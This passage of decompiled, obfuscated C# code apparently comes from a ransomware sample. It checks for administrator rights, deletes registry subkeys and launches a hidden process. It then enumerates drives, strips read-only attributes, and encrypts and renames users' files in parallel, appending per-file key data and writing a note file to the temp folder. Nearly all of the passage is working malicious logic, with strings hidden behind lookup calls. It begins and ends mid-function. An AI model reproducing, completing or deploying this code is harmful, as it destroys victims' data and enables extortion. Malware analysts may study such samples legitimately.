		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(secureString_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void glPlTUDxsyCftd()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = ouaHPvfKVdnz(getString_0(107391084));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(hNmpLWayyKYy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107391490)));
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107391433)));
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107391416)));
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107391423)));
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107391118)));
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107391398)));
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107391337)));
					registryKey.Close();
				}
				string_ = ouaHPvfKVdnz(getString_0(107390808));
				registryKey = Registry.LocalMachine.OpenSubKey(hNmpLWayyKYy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107390711)));
					registryKey.Close();
				}
				string_ = ouaHPvfKVdnz(getString_0(107390726));
				registryKey = Registry.LocalMachine.OpenSubKey(hNmpLWayyKYy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107390711)));
					registryKey.Close();
				}
				string_ = ouaHPvfKVdnz(getString_0(107390726));
				registryKey = Registry.CurrentUser.OpenSubKey(hNmpLWayyKYy(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(hNmpLWayyKYy(getString_0(107390711)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107390677)), hNmpLWayyKYy(getString_0(107390692)));
			WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107390611)), hNmpLWayyKYy(getString_0(107390602)));
			WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107390611)), hNmpLWayyKYy(getString_0(107390968)));
			WMwWOqjOFtUT(hNmpLWayyKYy(getString_0(107390939)), hNmpLWayyKYy(getString_0(107390890)));
		}
		catch
		{
		}
	}

	public static void GoDAxkQbrqjFWYn(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(hNmpLWayyKYy(getString_0(107390849)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void GYLxswafJgK()
	{
		WMwWOqjOFtUT(getString_0(107396817), hNmpLWayyKYy(getString_0(107390312)));
		string text = hNmpLWayyKYy(getString_0(107390118));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107391173) + text + getString_0(107391173) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396817);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void vMQXbyqMVqGcq(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (keaHDdagjiDMCTfH)
			{
				try
				{
					File.AppendAllText(RztYwSIsnQJzs, getString_0(107390565) + string_0 + getString_0(107390556) + ex.Message + getString_0(107396273));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string qalydKPwEW()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107394035);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390467);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390490))) ? getString_0(107390472) : getString_0(107390449));
				break;
			case 0:
				text = getString_0(107390495);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390462);
				break;
			case 4:
				text = getString_0(107390417);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107390431) : getString_0(107390440));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107390407) : getString_0(107390380)) : getString_0(107390385)) : getString_0(107390426));
				break;
			case 10:
				text = getString_0(107390402);
				break;
			}
		}
		if (text != getString_0(107394035))
		{
			text = getString_0(107390397) + text;
			if (oSVersion.ServicePack != getString_0(107394035))
			{
				text = text + getString_0(107392669) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string bXKCqhMTSyKC(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395975);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(hNmpLWayyKYy(getString_0(107395430)));
				streamWriter.WriteLine(getString_0(107396273));
				streamWriter.WriteLine(hNmpLWayyKYy(getString_0(107394500)));
				streamWriter.WriteLine(string_0);
			}
			else
			{
				File.AppendAllText(text, getString_0(107393846) + string_0);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (keaHDdagjiDMCTfH)
			{
				try
				{
					File.AppendAllText(RztYwSIsnQJzs, getString_0(107390352) + ex.Message + getString_0(107396273));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void SZjoOjixXJ(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		ZfhkFAGYSoSgG.uGHizjENRddCfr CS_0024_003C_003E8__locals0 = new ZfhkFAGYSoSgG();
		CS_0024_003C_003E8__locals0.NRLfKStyarqBcj = string_1;
		CS_0024_003C_003E8__locals0.oiQrubJaQK = string_2;
		CS_0024_003C_003E8__locals0.gZBWhvjRsG = string_3;
		CS_0024_003C_003E8__locals0.rUaFCnBVYOEj = string_4;
		OasPkTxEhkqARxDV = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.gZBWhvjRsG);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396602))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !tkcHcCnvalC.Contains(array[i].Name))
					{
						tkcHcCnvalC.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!tkcHcCnvalC.Contains(string_0[j]))
				{
					tkcHcCnvalC.Add(string_0[j]);
				}
			}
		}
		if (tkcHcCnvalC.Contains(hNmpLWayyKYy(getString_0(107389783))) && VhcrQXrEyRMEqG == getString_0(107396964))
		{
			tkcHcCnvalC.Remove(hNmpLWayyKYy(getString_0(107389783)));
		}
		Parallel.ForEach(tkcHcCnvalC, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new ZfhkFAGYSoSgG.uGHizjENRddCfr();
			CS_0024_003C_003E8__locals0.mUgenAdltUHHhw = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.SMGORJpOwHGvru = string_0;
			if (IqUPhqLWEelTFf && !qalydKPwEW().Contains(ZfhkFAGYSoSgG.getString_0(107390440)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						bUXhgPibIRSr(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.SMGORJpOwHGvru);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (htNfweWWpfJ == ZfhkFAGYSoSgG.getString_0(107396973))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					SxsmLPyGxple(CS_0024_003C_003E8__locals0.SMGORJpOwHGvru, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.NRLfKStyarqBcj, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.rUaFCnBVYOEj, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.oiQrubJaQK, CS_0024_003C_003E8__locals0.mUgenAdltUHHhw.gZBWhvjRsG);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				SxsmLPyGxple(CS_0024_003C_003E8__locals0.SMGORJpOwHGvru, CS_0024_003C_003E8__locals0.NRLfKStyarqBcj, CS_0024_003C_003E8__locals0.rUaFCnBVYOEj, CS_0024_003C_003E8__locals0.oiQrubJaQK, CS_0024_003C_003E8__locals0.gZBWhvjRsG);
			}
		});
	}

	public static void SxsmLPyGxple(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107394035));
		List<string> list3 = list2;
		if (tFfqxfbrSvYza == getString_0(107396421))
		{
			list = aBOgOmLiYavG(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = rTWQkwAFUITjPi.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((LJtiQtEQkud == getString_0(107396421) && !item.EndsWith(text)) || yjAazhPgxhDIu.Contains(item))
				{
					continue;
				}
				if (MQUfpBGDuCn == getString_0(107396964))
				{
					try
					{
						if (FoJEBmAKQRl.kzWoqBsyxTSV(item))
						{
							FoJEBmAKQRl.iGdfIpreqzioppCmo(item);
						}
					}
					catch
					{
					}
				}
				yjAazhPgxhDIu.Add(item);
				if (!hxATskUeUhTwX.Contains(Path.GetDirectoryName(item)))
				{
					hxATskUeUhTwX.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (YNNeNxsxnCwT == getString_0(107396964) && fileStream.Length > Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024 && !list3.Contains(text))
					{
						if (yXsKxXdmTMDNpi == getString_0(107396964))
						{
							foreach (string item2 in mvTZfeUAoYGCG)
							{
								if (item.ToLower().EndsWith(item2) && RvOsVhMhBnkE == getString_0(107396964))
								{
									if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && RvOsVhMhBnkE == getString_0(107396421))
								{
									try
									{
										TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(getString_0(107394148), getString_0(107394143), getString_0(107394098), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = MxUzGRRcXX.QuWsNWvThdQ(item, Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024);
						byte[] rFvIApGcuwP = MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						MxUzGRRcXX.odkHVYyoApHj(item, rFvIApGcuwP);
						if (string_2 != getString_0(107389774))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107389774))
					{
						ZunguhwEHnwVZ(item, item + string_2, OasPkTxEhkqARxDV);
					}
					else
					{
						ZunguhwEHnwVZ(item, item + getString_0(107389769), OasPkTxEhkqARxDV);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void YybwhxQIQLrI(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		hsgCGlZmFqZgdS.iWNmFMCphk CS_0024_003C_003E8__locals0 = new hsgCGlZmFqZgdS();
		CS_0024_003C_003E8__locals0.AKWToBmSQCY = list_0;
		CS_0024_003C_003E8__locals0.IWdEctQcjcfU = string_1;
		CS_0024_003C_003E8__locals0.iCksgxyMsFHT = string_2;
		CS_0024_003C_003E8__locals0.cGVxFqKPccB = string_3;
		CS_0024_003C_003E8__locals0.hIEBOeIGEZvf = new List<string> { getString_0(107394035) };
		if (LJtiQtEQkud == getString_0(107396421))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.AKWToBmSQCY)
				{
					if (CS_0024_003C_003E8__locals0.iCksgxyMsFHT.Length != 0)
					{
						string[] iCksgxyMsFHT2 = CS_0024_003C_003E8__locals0.iCksgxyMsFHT;
						int num2 = 0;
						while (num2 < iCksgxyMsFHT2.Length)
						{
							string value2 = iCksgxyMsFHT2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_06c5;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.IWdEctQcjcfU))
						{
							goto IL_06c5;
						}
					}
					catch (Exception)
					{
						goto IL_06c5;
					}
					if (item.EndsWith(string_0) && !yjAazhPgxhDIu.Contains(item))
					{
						if (MQUfpBGDuCn == hsgCGlZmFqZgdS.getString_0(107396981))
						{
							try
							{
								if (FoJEBmAKQRl.kzWoqBsyxTSV(item))
								{
									FoJEBmAKQRl.iGdfIpreqzioppCmo(item);
								}
							}
							catch
							{
							}
						}
						yjAazhPgxhDIu.Add(item);
						if (!hxATskUeUhTwX.Contains(Path.GetDirectoryName(item)))
						{
							hxATskUeUhTwX.Add(Path.GetDirectoryName(item));
						}
						vMQXbyqMVqGcq(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ef;
								}
								goto end_IL_00ef_2;
								end_IL_00ef:;
							}
							catch (Exception ex12)
							{
								if (keaHDdagjiDMCTfH)
								{
									try
									{
										File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + item + hsgCGlZmFqZgdS.getString_0(107407780) + ex12.Message + hsgCGlZmFqZgdS.getString_0(107396290));
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00ef_2;
							}
							if (YNNeNxsxnCwT == hsgCGlZmFqZgdS.getString_0(107396981) && new FileInfo(item).Length > Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.hIEBOeIGEZvf.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new hsgCGlZmFqZgdS.YibPRBMfpiof();
								CS_0024_003C_003E8__locals0.TpAgeLiVgB = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
									{
										File.Move(item, item + CS_0024_003C_003E8__locals0.IWdEctQcjcfU);
									}
								}
								catch (Exception ex14)
								{
									if (!keaHDdagjiDMCTfH)
									{
										break;
									}
									try
									{
										File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + item + hsgCGlZmFqZgdS.getString_0(107407207) + ex14.Message + hsgCGlZmFqZgdS.getString_0(107396290));
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								CS_0024_003C_003E8__locals0.svwZpKIpClQ = hsgCGlZmFqZgdS.getString_0(107394052);
								if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
								{
									CS_0024_003C_003E8__locals0.svwZpKIpClQ = item + CS_0024_003C_003E8__locals0.IWdEctQcjcfU;
								}
								else
								{
									CS_0024_003C_003E8__locals0.svwZpKIpClQ = item;
								}
								if (yXsKxXdmTMDNpi == hsgCGlZmFqZgdS.getString_0(107396981))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in mvTZfeUAoYGCG)
										{
											if (CS_0024_003C_003E8__locals0.svwZpKIpClQ.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.TpAgeLiVgB.IWdEctQcjcfU) && RvOsVhMhBnkE == hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107396984))
											{
												if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.svwZpKIpClQ).Length)
												{
													try
													{
														TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107394168), hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107394163), hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107394118), CS_0024_003C_003E8__locals0.svwZpKIpClQ);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.svwZpKIpClQ.ToLower().EndsWith(item2) && RvOsVhMhBnkE == hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107396441))
											{
												try
												{
													TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107394168), hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107394163), hsgCGlZmFqZgdS.YibPRBMfpiof.getString_0(107394118), CS_0024_003C_003E8__locals0.svwZpKIpClQ);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
								string s3 = NkovHMVDww.EAiaLHGuShXIai(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = MxUzGRRcXX.QuWsNWvThdQ(CS_0024_003C_003E8__locals0.svwZpKIpClQ, Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024);
								MxUzGRRcXX.odkHVYyoApHj(rFvIApGcuwP: (!ZzeIutOVdkVrn) ? (fYzeXSQMFrly ? MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fYzeXSQMFrly ? HfiFGrXOdAS.empuJnDsZdZVMo(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HfiFGrXOdAS.empuJnDsZdZVMo(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZjXIlWQLYaMG: CS_0024_003C_003E8__locals0.svwZpKIpClQ, jaymlfBImxINZRaE: bytes3);
							}
							else
							{
								string text4 = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
								string s4 = NkovHMVDww.EAiaLHGuShXIai(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
								{
									if (!RySdpyQRxMNXcP)
									{
										if (!fYzeXSQMFrly)
										{
											yyIfDArNcCubd(item, item + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, OasPkTxEhkqARxDV);
										}
										else
										{
											yyIfDArNcCubd(item, item + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!fYzeXSQMFrly)
											{
												aofPqeDxZqP(item, item + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, OasPkTxEhkqARxDV);
											}
											else
											{
												aofPqeDxZqP(item, item + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (keaHDdagjiDMCTfH)
											{
												try
												{
													File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + item + hsgCGlZmFqZgdS.getString_0(107389809) + ex16.Message + hsgCGlZmFqZgdS.getString_0(107396290));
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!RySdpyQRxMNXcP)
								{
									if (!fYzeXSQMFrly)
									{
										yyIfDArNcCubd(item, item + hsgCGlZmFqZgdS.getString_0(107389786), OasPkTxEhkqARxDV);
									}
									else
									{
										yyIfDArNcCubd(item, item + hsgCGlZmFqZgdS.getString_0(107389786), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!fYzeXSQMFrly)
										{
											aofPqeDxZqP(item, item, OasPkTxEhkqARxDV);
										}
										else
										{
											aofPqeDxZqP(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (keaHDdagjiDMCTfH)
										{
											try
											{
												File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + item + hsgCGlZmFqZgdS.getString_0(107389809) + ex18.Message + hsgCGlZmFqZgdS.getString_0(107396290));
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (fYzeXSQMFrly)
								{
									if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
									{
										GoDAxkQbrqjFWYn(item + CS_0024_003C_003E8__locals0.IWdEctQcjcfU, bytes4);
									}
									else
									{
										GoDAxkQbrqjFWYn(item, bytes4);
									}
								}
							}
							goto IL_06c5;
							end_IL_00ef_2:;
						}
						catch (Exception)
						{
							goto IL_06c5;
						}
					}
					continue;
					IL_06c5:
					CS_0024_003C_003E8__locals0.AKWToBmSQCY.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.AKWToBmSQCY, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new hsgCGlZmFqZgdS.iWNmFMCphk();
			CS_0024_003C_003E8__locals0.TpAgeLiVgB = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.itKWIypHRJi = string_0;
			if (CS_0024_003C_003E8__locals0.iCksgxyMsFHT.Length != 0)
			{
				string[] iCksgxyMsFHT = CS_0024_003C_003E8__locals0.iCksgxyMsFHT;
				int num = 0;
				while (num < iCksgxyMsFHT.Length)
				{
					string value = iCksgxyMsFHT[num];
					if (!CS_0024_003C_003E8__locals0.itKWIypHRJi.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.itKWIypHRJi.EndsWith(CS_0024_003C_003E8__locals0.IWdEctQcjcfU))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!yjAazhPgxhDIu.Contains(CS_0024_003C_003E8__locals0.itKWIypHRJi))
			{
				if (MQUfpBGDuCn == hsgCGlZmFqZgdS.getString_0(107396981))
				{
					try
					{
						if (FoJEBmAKQRl.kzWoqBsyxTSV(CS_0024_003C_003E8__locals0.itKWIypHRJi))
						{
							FoJEBmAKQRl.iGdfIpreqzioppCmo(CS_0024_003C_003E8__locals0.itKWIypHRJi);
						}
					}
					catch
					{
					}
				}
				yjAazhPgxhDIu.Add(CS_0024_003C_003E8__locals0.itKWIypHRJi);
				if (!hxATskUeUhTwX.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.itKWIypHRJi)))
				{
					hxATskUeUhTwX.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.itKWIypHRJi));
				}
				vMQXbyqMVqGcq(CS_0024_003C_003E8__locals0.itKWIypHRJi);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.itKWIypHRJi).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (keaHDdagjiDMCTfH)
						{
							try
							{
								File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + hsgCGlZmFqZgdS.getString_0(107407780) + ex2.Message + hsgCGlZmFqZgdS.getString_0(107396290));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (YNNeNxsxnCwT == hsgCGlZmFqZgdS.getString_0(107396981) && new FileInfo(CS_0024_003C_003E8__locals0.itKWIypHRJi).Length > Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
							{
								File.Move(CS_0024_003C_003E8__locals0.itKWIypHRJi, CS_0024_003C_003E8__locals0.itKWIypHRJi + CS_0024_003C_003E8__locals0.IWdEctQcjcfU);
							}
						}
						catch (Exception ex4)
						{
							if (keaHDdagjiDMCTfH)
							{
								try
								{
									File.AppendAllText(RztYwSIsnQJzs, hsgCGlZmFqZgdS.getString_0(107390582) + CS_0024_003C_003E8__locals0.itKWIypHRJi + hsgCGlZmFqZgdS.getString_0(107407207) + ex4.Message + hsgCGlZmFqZgdS.getString_0(107396290));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
						{
							CS_0024_003C_003E8__locals0.itKWIypHRJi += CS_0024_003C_003E8__locals0.IWdEctQcjcfU;
						}
						if (yXsKxXdmTMDNpi == hsgCGlZmFqZgdS.getString_0(107396981))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in mvTZfeUAoYGCG)
								{
									if (CS_0024_003C_003E8__locals0.itKWIypHRJi.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.TpAgeLiVgB.IWdEctQcjcfU) && RvOsVhMhBnkE == hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107396987))
									{
										if (Convert.ToInt32(WgsiGxlkcXCewl) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.itKWIypHRJi).Length)
										{
											try
											{
												TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107394171), hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107394166), hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107394121), CS_0024_003C_003E8__locals0.itKWIypHRJi);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.itKWIypHRJi.ToLower().EndsWith(item3) && RvOsVhMhBnkE == hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107396444))
									{
										try
										{
											TvsCtQOAQyGAc.dSnpGcfDOUGHpZ(hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107394171), hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107394166), hsgCGlZmFqZgdS.iWNmFMCphk.getString_0(107394121), CS_0024_003C_003E8__locals0.itKWIypHRJi);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
						string s = NkovHMVDww.EAiaLHGuShXIai(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = MxUzGRRcXX.QuWsNWvThdQ(CS_0024_003C_003E8__locals0.itKWIypHRJi, Convert.ToInt32(lgEGKUPjGpcc) * 1024 * 1024);
						MxUzGRRcXX.odkHVYyoApHj(rFvIApGcuwP: (!ZzeIutOVdkVrn) ? (fYzeXSQMFrly ? MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : MxUzGRRcXX.MrKxWXWOvvtfxsJ(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (fYzeXSQMFrly ? HfiFGrXOdAS.empuJnDsZdZVMo(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HfiFGrXOdAS.empuJnDsZdZVMo(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.cGVxFqKPccB), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZjXIlWQLYaMG: CS_0024_003C_003E8__locals0.itKWIypHRJi, jaymlfBImxINZRaE: bytes);
					}
					else
					{
						string text2 = gJxaSuoOQaPVid.gnXBQuQIgzoruM(32);
						string s2 = NkovHMVDww.EAiaLHGuShXIai(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.IWdEctQcjcfU != hsgCGlZmFqZgdS.getString_0(107389791))
						{
							if (!RySdpyQRxMNXcP)
							{
								if (!fYzeXSQMFrly)
								{
